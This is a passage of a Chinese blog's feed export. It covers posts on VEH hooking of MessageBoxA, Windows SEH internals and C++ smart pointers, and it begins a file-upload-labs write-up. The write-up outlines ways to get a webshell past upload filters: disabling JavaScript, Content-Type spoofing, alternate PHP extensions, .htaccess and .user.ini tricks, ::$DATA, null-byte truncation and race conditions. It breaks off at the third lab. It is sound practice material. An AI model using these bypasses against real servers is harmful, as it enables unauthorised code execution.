HMODULE user32 = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    breakPoint0 = (DWORD)<span class="built_in">GetProcAddress</span>(user32, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置断点 局部有效</span></span><br><span class="line">    CONTEXT context = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;</span><br><span class="line">    context.Dr7 = <span class="number">1</span>;</span><br><span class="line">    context.Dr0 = breakPoint0;</span><br><span class="line">    main_thread = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">    <span class="built_in">SetThreadContext</span>(main_thread, &amp;context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用 触发断点处理异常</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;我是谁？&quot;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;成功执行...&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码hook了messageBoxA这个函数，hook的时候执行了两次，一次原函数，一次修改输出后的函数，可以正确返回；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;VEH介绍&quot;&gt;&lt;a href=&quot;#VEH介绍&quot; class=&quot;headerlink&quot; title=&quot;VEH介绍&quot;&gt;&lt;/a&gt;VEH介绍&lt;/h2&gt;&lt;p&gt;全称 vector exception handle，向量化异常处理；&lt;/p&gt;
&lt;p&gt;和SEH类似的东西，SEH存放</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Bin" scheme="https://secondbc.github.io/SecondBC/tags/Bin/"/>
    
  </entry>
  
  <entry>
    <title>WindowsSEH</title>
    <link href="https://secondbc.github.io/SecondBC/2024/05/13/WindowsSEH/"/>
    <id>https://secondbc.github.io/SecondBC/2024/05/13/WindowsSEH/</id>
    <published>2024-05-13T09:35:04.000Z</published>
    <updated>2024-05-13T09:37:10.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>全称 Structured Exception Handling</p><p>是windows操作系统默认的异常处理机制；</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用 _try 包裹可能出现异常的语句</p><p>_except()处理异常，当括号内为真的时候，执行处理语句；</p><p>例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;123\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    _except(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;执行!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当程序触发异常后，程序会进行ip寄存器的跳转：</p><p>非调试状态下运行程序，触发后判断是否存在<em><strong>异常处理器</strong></em>（一个函数，在上述例子中，写上了try和except()编译器给程序添加了异常处理器，并会处理except中的内容），否则退出程序；</p><p>调试状态下，操作系统会优先将异常抛给调试进程（断点原理），之后调试器的选择有：</p><ul><li>修改触发异常的代码继续执行</li><li>忽略异常交给SEH执行</li></ul><p>则windows发生异常后的处理顺序为：调试器，SEH，结束程序；</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span><span class="comment">//指向下一个节点</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;<span class="comment">//异常处理器（回调处理函数）</span></span><br><span class="line">&#125;EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><p>这是一个链表结构中的节点，所以SEH是以链式存在的；</p><p>第一个节点位置位于 fs:[0] 段寄存器处（同时是TEB结构，即TEB第一个字段就是异常处理链）；</p><p>当异常发生时，从第一个节点开始处理，之后向后传递依次处理，直到处理成功，可以返回原本位置继续执行，否则退出程序；</p><p>最后一个节点next指针指向 0xFFFFFFFF；</p><p>当在程序中写入了_try和_except之后，操作系统会动态的生成一个节点结构，从头部插入；</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要提一嘴的是，windows异常抛出的种类特别多，而调试器的设置有很重要的因素，在逆向的时候，遇到一些异常（比如c0005，0地址执行），直接运行过去会导致断点在SEH已经处理完的时候，并不会断在异常发生的时候，这和调试器的异常捕获设置有关；</p><p>调试器一般就只会在CC断点异常处断下；</p><p>也可以找到fs:[0]的地方，将断点直接打在SEH链表头部，这样发生异常就能断下来；</p><p>对于32位程序来说，用高级语言写的_try_except生成的新节点插入会在汇编中以如下的形式体现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push ExceptionHandler;编译器生成的异常处理器</span><br><span class="line">mov eax, dword ptr fs:[0];原先的SEH链表头部</span><br><span class="line">push eax</span><br><span class="line">mov dword ptr fs:[0], esp</span><br></pre></td></tr></table></figure><p>此时在栈中，原先SEH头部地址在上，相当于新节点的next，编译器给的函数在下，相当于新节点的Handler，此时esp指向新节点的第一个字段next，也就是新节点头部，所以将esp又给予fs:[0]，为原链表在头部添加了一个新节点；</p><p>但要注意这只在这个函数体（栈帧）里有效，函数结束时会做出相应的栈平衡，并释放栈；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;全称 Structured Exception Handling&lt;/p&gt;
&lt;p&gt;是windows操作系统默认的异常处理机制；&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Bin" scheme="https://secondbc.github.io/SecondBC/tags/Bin/"/>
    
  </entry>
  
  <entry>
    <title>CPP补充：智能指针</title>
    <link href="https://secondbc.github.io/SecondBC/2024/02/26/CPP%E8%A1%A5%E5%85%85%EF%BC%9A%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"/>
    <id>https://secondbc.github.io/SecondBC/2024/02/26/CPP%E8%A1%A5%E5%85%85%EF%BC%9A%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/</id>
    <published>2024-02-26T08:50:07.000Z</published>
    <updated>2024-02-26T09:27:13.848Z</updated>
    
    <content type="html"><![CDATA[<p>本文参考及图片引用：<a href="https://blog.csdn.net/cpp_learner/article/details/118912592">C++ 智能指针 - 全部用法详解-CSDN博客</a></p><h2 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h2><p>避免CPP里面的内存泄漏；</p><p>例子：</p><p>当 new 一个对象的时候，在其生命周期结束时，系统会自动调用它的析构函数；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Test</span>() &#123; cout &lt;&lt; <span class="string">&quot;Test的构造函数...&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">~<span class="built_in">Test</span>() &#123; cout &lt;&lt; <span class="string">&quot;Test的析构函数...&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getDebug</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;debug; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> debug = <span class="number">20</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Test a = <span class="built_in">Test</span>();</span><br><span class="line">cout &lt;&lt; a.<span class="built_in">getDebug</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/26/8zYUQ7cwjBWgN2q.png" alt="test1"></p><p>但是，当 new 一个对象指针指向一个匿名对象的时候，在这个对象生命周期应该结束时，并不会调用它的析构函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Test * a = <span class="keyword">new</span> <span class="built_in">Test</span>();</span><br><span class="line">cout &lt;&lt; a-&gt;<span class="built_in">getDebug</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/26/VuWKbsh1MRFvDak.png" alt="test2"></p><p>换句话说，当有对象被引用的时候，就有可能导致内存泄漏，一旦内存泄漏，就会消耗整个程序的资源和效率，更甚至导致异常中断；</p><p>所以智能指针便是用来处理这个问题的；</p><h2 id="实质"><a href="#实质" class="headerlink" title="实质"></a>实质</h2><p>智能指针的实质实际上是一个模板类，它会管理给予它的特定类型指针，并对于指针的操作给予了很多运算符上的重载，所以在使用的时候可以直接将智能指针变量当作管理的指针直接使用；</p><p>所以你明白了智能指针为何可以对于引用的对象进行自动析构，因为它本身就是个对象，它的析构里自然就写进了析构引用的指针的操作；</p><p>所以？所以<strong>别再指针化的使用或引用</strong>这个类的类对象了，因为会导致之前的问题重复；</p><p>以下提到的 智能指针 这个名词，都可以理解是类的名字，它不是一个实际意义上的指针；</p><h2 id="类别及其用法"><a href="#类别及其用法" class="headerlink" title="类别及其用法"></a>类别及其用法</h2><p>所谓的智能指针在CPP中普遍使用也就存在4种形式： auto_ptr, unique_ptr, shared_ptr, weak_ptr；</p><p>其中，第一个在C++98中给出，后面三个在C++11中给出，作为前者的进阶版；</p><h3 id="auto-ptr"><a href="#auto-ptr" class="headerlink" title="auto_ptr"></a>auto_ptr</h3><p>用法:<br>头文件: #include &lt; memory &gt;<br>用 法: auto_ptr&lt;类型&gt; 变量名(new 类型)</p><p>这个类型是指针，但不用加*强调，写法比较奇怪，可以尝试用构造函数的调用来理解；</p><p>举例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">auto_ptr&lt; string &gt; <span class="title">str</span><span class="params">(<span class="keyword">new</span> string(“要成为大牛~ 变得很牛逼！”))</span></span>;</span><br><span class="line">auto_ptr&lt;vector&lt; <span class="keyword">int</span> &gt;&gt; <span class="built_in">av</span>(<span class="keyword">new</span> vector&lt; <span class="keyword">int</span> &gt;());</span><br><span class="line"><span class="function">auto_ptr&lt; <span class="keyword">int</span> &gt; <span class="title">array</span><span class="params">(<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>])</span></span>;</span><br></pre></td></tr></table></figure><p>就第一部分遇到的问题，如何用智能指针解决：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">auto_ptr&lt;Test&gt; <span class="title">a</span><span class="params">(<span class="keyword">new</span> Test())</span></span>;</span><br><span class="line">cout &lt;&lt; a-&gt;<span class="built_in">getDebug</span>() &lt;&lt; endl;<span class="comment">//重载运算符，也可以用*a来引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个样子便解决了之前提到的引用匿名对象的无法析构的问题；</p><h4 id="智能指针中三大函数"><a href="#智能指针中三大函数" class="headerlink" title="智能指针中三大函数"></a>智能指针中三大函数</h4><h5 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h5><p>作用是返回智能指针类管理的真实指针地址；</p><p>上面使用auto_ptr的代码可以等效为如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">auto_ptr&lt;Test&gt; <span class="title">a</span><span class="params">(<span class="keyword">new</span> Test())</span></span>;</span><br><span class="line">Test* tmp = a.<span class="built_in">get</span>();</span><br><span class="line">cout &lt;&lt; tmp-&gt;<span class="built_in">getDebug</span>() &lt;&lt; endl;</span><br><span class="line"><span class="comment">//delete tmp;  禁止析构智能指针管理的指针，不然会double free</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="release"><a href="#release" class="headerlink" title="release()"></a>release()</h5><p>作用是取消智能指针对管理地址的管理，将管理区置为NULL；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">auto_ptr&lt;Test&gt; <span class="title">a</span><span class="params">(<span class="keyword">new</span> Test())</span></span>;</span><br><span class="line">Test *tmp = a.<span class="built_in">release</span>();</span><br><span class="line"><span class="keyword">delete</span> tmp;</span><br></pre></td></tr></table></figure><p>取消管理之后交给对应的指针变量，此时需要自己手动析构；</p><p>同时注意不能直接调用 <code>a.release()</code> ， 如果直接使用，此时智能指针管理的指针为NULL，同时没有变量接收之前管理的内存地址，就会造成内存泄漏；</p><h5 id="reset"><a href="#reset" class="headerlink" title="reset()"></a>reset()</h5><p>重置智能指针管理的内存地址；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">auto_ptr&lt;Test&gt; <span class="title">a</span><span class="params">(<span class="keyword">new</span> Test())</span></span>;</span><br><span class="line"></span><br><span class="line">a.<span class="built_in">reset</span>();<span class="comment">// 释放掉智能指针托管的指针内存，并将其置NULL</span></span><br><span class="line"></span><br><span class="line">a.<span class="built_in">reset</span>(<span class="keyword">new</span> <span class="built_in">Test</span>()); <span class="comment">// 释放掉智能指针托管的指针内存，并将参数指针取代之</span></span><br></pre></td></tr></table></figure><h4 id="注意事项以及缺陷"><a href="#注意事项以及缺陷" class="headerlink" title="注意事项以及缺陷"></a>注意事项以及缺陷</h4><ul><li><p>不要将auto_ptr变量定义为全局变量以及指针；</p></li><li><p>使用它的赋值运算和拷贝构造时，实际上是在做管理指针的转移；</p><p>假如p1和p2是两个已经初始化的智能指针，那么执行p1 = p2：</p><p><img src="https://s2.loli.net/2024/02/26/nAzol4O7CILixys.png" alt="trans"><br>图中的地址是由get()获取；</p></li><li><p>STL中使用auto_ptr不安全，因为容器元素需要支持复制和赋值：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;auto_ptr&lt;string&gt;&gt; vec;</span><br><span class="line"><span class="function">auto_ptr&lt;string&gt; <span class="title">p3</span><span class="params">(<span class="keyword">new</span> string(<span class="string">&quot;I&#x27;m P3&quot;</span>))</span></span>;</span><br><span class="line"><span class="function">auto_ptr&lt;string&gt; <span class="title">p4</span><span class="params">(<span class="keyword">new</span> string(<span class="string">&quot;I&#x27;m P4&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须使用std::move修饰成右值，才可以进行插入容器中</span></span><br><span class="line">vec.<span class="built_in">push_back</span>(std::<span class="built_in">move</span>(p3));</span><br><span class="line">vec.<span class="built_in">push_back</span>(std::<span class="built_in">move</span>(p4));</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;vec.at(0)：&quot;</span> &lt;&lt;  *vec.<span class="built_in">at</span>(<span class="number">0</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;vec[1]：&quot;</span> &lt;&lt;  *vec[<span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 风险来了：</span></span><br><span class="line">vec[<span class="number">0</span>] = vec[<span class="number">1</span>];<span class="comment">// 如果进行赋值，问题又回到了上面一个问题中。</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;vec.at(0)：&quot;</span> &lt;&lt; *vec.<span class="built_in">at</span>(<span class="number">0</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;vec[1]：&quot;</span> &lt;&lt; *vec[<span class="number">1</span>] &lt;&lt; endl;</span><br></pre></td></tr></table></figure><p>此时运行这段代码会导致访问越界中断；</p></li><li><p>不支持对象数组的内存管理：<br><img src="https://s2.loli.net/2024/02/26/JiOCnm65zXkhVfx.png" alt="inside"></p></li></ul><h3 id="unique-ptr"><a href="#unique-ptr" class="headerlink" title="unique_ptr"></a>unique_ptr</h3><p>为了解决上述提出来的关于 auto_ptr 的缺陷， C++新版本更新了这个进阶版；</p><p>它比较于 auto_ptr 来说，多了三个优势：</p><ul><li>依然无法进行左值构造和赋值，但是可以允许临时的右值构造和赋值；</li><li>在容器中使用是安全的；</li><li>允许对象数组的内存管理；</li></ul><p>同时这里要强调一下，不管是 auto_ptr 还是 unique_ptr ，它们都是基于排他所有权模式：两个指针不能指向同一个资源；</p><p>这样一来就还是有一个问题：</p><p>unique_ptr的右值赋值效果等同于auto_ptr的=号赋值，只是做指针的转移，而非复制；</p><p>同样两个智能指针使用reset接管同一个指针的时候，最后一个会起接管作用，前者会被置零；</p><p>什么叫左值，右值？ –&gt; 左值指有专门内存空间的变量， 不是左值的都叫右值，可以是寄存器里的数，也可以是一个立即数；</p><p>那么如何实现两个智能指针的复制呢？如同平常使用的对象和类型的时候=号的第一直觉操作？</p><p>引出shared_ptr；</p><h3 id="shared-ptr"><a href="#shared-ptr" class="headerlink" title="shared_ptr"></a>shared_ptr</h3><p>它的出现解决了复制内存地址引用给多个智能指针使用；</p><p>至于如何实现的，首先需要回想一下，智能指针是干什么的；</p><p>智能指针用于解决引用对象的自动析构，那么引用的对象都析构了，另一个智能指针引用同样内存位置该析构谁呢？NULL吗？</p><p>所以shared_ptr和unique_ptr功能一模一样，可以理解为只是多了一个引用计数的静态类变量；</p><p>当有多个智能指针指向同一个内存地址时，引用次数就是那么多，每次在智能指针类做复制的时候在构造函数里将次数加一，析构的时候，将次数减一，判断为一的时候则析构引用的内存地址，这样就解决了引用共享问题；</p><p>引用次数的获取可以使用如下函数（use_count()）：</p><p><img src="https://s2.loli.net/2024/02/26/76Dg4ZzN8eBYaSi.png" alt="shared"></p><p>但这又引出一个新的问题；</p><h4 id="循环引用"><a href="#循环引用" class="headerlink" title="循环引用"></a>循环引用</h4><p>当一个A类中有B类的智能指针，且B类里也有A类的智能指针的时候；</p><p>当B类智能指针创建时，B引用次数加一，A类智能指针创建时，A引用次数加一；</p><p>A中引用B类智能指针时，B引用次数加一为二，同理B中引用A，A的引用次数也变为二；</p><p>这个时候系统生命周期结束时，释放创建时的智能指针，则A和B的引用次数都减1，变为1；</p><p>此时A类要析构，就需要先析构其中的B类智能指针，B类要析构，就需要先析构A类，造成无限循环等待；</p><h3 id="weak-ptr"><a href="#weak-ptr" class="headerlink" title="weak_ptr"></a>weak_ptr</h3><blockquote><p>weak_ptr 设计的目的是为配合 shared_ptr 而引入的一种智能指针来协助 shared_ptr 工作, 它只可以从一个 shared_ptr 或另一个 weak_ptr 对象构造, 它的构造和析构不会引起引用记数的增加或减少。 同时weak_ptr 没有重载*和-&gt;但可以使用 lock 获得一个可用的 shared_ptr 对象。</p></blockquote><p>它的出现就是为了解决循环引用；</p><p>在智能指针类中如需引用另一个智能指针，最好就写为weak类型，这样它不会改变引用的次数，从而破局循环引用；</p><p>一个weak类型可以直接由shared拷贝构造或者复制而来；</p><p>但weak类型不能复制或者拷贝构造给shared类型，需要使用lock()函数重新变成shared类型，同时引用次数+1；</p><p>weak指针有一个函数是 expired() ，作用是判断当前指针是否还有管理的对象，有返回false，无返回true；</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>详细有关智能指针的代码操作如赋值，构造，析构，等等以及有关循环引用的更全面的讲解请查看第一行给出的参考网址；</p><p>本文更偏向于条目梳理和简单回顾；</p><p>大多数使用智能指针会出现的错误均已在上述给出，但这里还要提一个没有给出的错误：</p><p>禁止用任何类型智能指针get函数返回的指针去初始化另一个智能指针：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">shared_ptr&lt; <span class="keyword">int</span> &gt; <span class="title">a</span><span class="params">(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">10</span>))</span></span>;</span><br><span class="line"><span class="comment">// 一个典型的错误用法 shared_ptr&lt; int &gt; b(a.get());</span></span><br></pre></td></tr></table></figure><p>实际上对于智能指针需要注意的操作也在于复制部分，如何利用好复制带来的方便的同时避免出错，就是智能指针需要掌握的点；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文参考及图片引用：&lt;a href=&quot;https://blog.csdn.net/cpp_learner/article/details/118912592&quot;&gt;C++ 智能指针 - 全部用法详解-CSDN博客&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;用处&quot;&gt;&lt;a href=&quot;#用处</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Cpp" scheme="https://secondbc.github.io/SecondBC/tags/Cpp/"/>
    
  </entry>
  
  <entry>
    <title>文件上传及其labs</title>
    <link href="https://secondbc.github.io/SecondBC/2024/02/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8A%E5%85%B6labs/"/>
    <id>https://secondbc.github.io/SecondBC/2024/02/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8A%E5%85%B6labs/</id>
    <published>2024-02-26T08:48:49.000Z</published>
    <updated>2024-02-26T08:49:34.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境配置问题"><a href="#环境配置问题" class="headerlink" title="环境配置问题"></a>环境配置问题</h2><p>phpStudy搭建，php版本需要选择ts的，相应的httpd-conf也需要调整，具体调整在下方给出；</p><p>所有配置都基于老版本的小皮，新版本干不起，估计和apache版本也有关系；</p><p>可以直接使用docker，又方便又省事；</p><h2 id="上传思路"><a href="#上传思路" class="headerlink" title="上传思路"></a>上传思路</h2><p>目的是为了把木马或webShell传到服务器上，服务器一般有判断，所以要绕过；</p><p>接下来的步骤思路即为靶场题目每道所得心得：</p><p>判断分为前端JS代码判断和后端代码判断，<strong>第一步</strong>就是区分是前端还是后端：</p><p>使用抓包软件拦截状态时上传文件，如果抓不到但出结果了判断为前端，否则为后端；</p><p>前端可以由禁用JS方法来解决，后端的花样比较多，一般而言，<strong>第二步</strong>先改包头content-type字段（其实大多数时候用不到，和ESP定律一个尿性）；</p><p><strong>第三步</strong>区分黑白名单，黑名单就尝试后缀绕过，如php3，php5，phtml（此方法针对于过滤不完全的黑名单机制）；</p><blockquote><p><em>补充知识：apache服务的php版本中带有nts(not thread safe)的，是非多线程安全的，目前流通使用的大多都是TS的；</em></p><p><em>而往往nts版本的php会导致有些漏洞利用不了；</em></p></blockquote><p><strong>第四步</strong>就是正儿八经的文件上传漏洞的入门内容了，.htaccess绕过，详细见P04；</p><p>.user.ini绕过，详见P05；</p><p>::$DATA绕过，详见P09；</p><p><strong>第五步</strong>便是正则绕过，各种特殊写法，在P05之后都有提及，（白名单）空字符（%00，0x00）截断；</p><p><strong>第六步</strong>是针对于文件内容检测的绕过思路，图片标识，图片🐎一类的尝试；</p><p>另类，则是<strong>条件竞争</strong>；</p><p>对于文件上传的总结位于P20，归于后缀绕过，内容绕过，条件利用三大类；</p><h2 id="P01"><a href="#P01" class="headerlink" title="P01"></a>P01</h2><p>通过BP抓包判断为前端检测，直接看前端JS，主要逻辑通过查找元素发现submit post之后返回一个check函数：</p><p><img src="https://s2.loli.net/2023/12/24/PksEGyLhMn5mZoc.png" alt="check"></p><p>搜索找到这个函数：</p><p><img src="https://s2.loli.net/2023/12/24/1zSCOINUT2pGL9P.png" alt="func"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对于前端检测而言，最有效的办法就是禁用网页的javaScript，这个禁用是针对全部的JS代码，所以有时候会影响一些功能导致无法使用，不过可以先试试；</p><p>这道题可以用上述方式解决；</p><h2 id="P02"><a href="#P02" class="headerlink" title="P02"></a>P02</h2><p>判断为后端执行检测；</p><p>这道题可以改content-type就可以绕过了：<br><img src="https://s2.loli.net/2023/12/24/fdHG7iUmCoOrNsJ.png" alt="content"></p><h2 id="P03"><a href="#P03" class="headerlink" 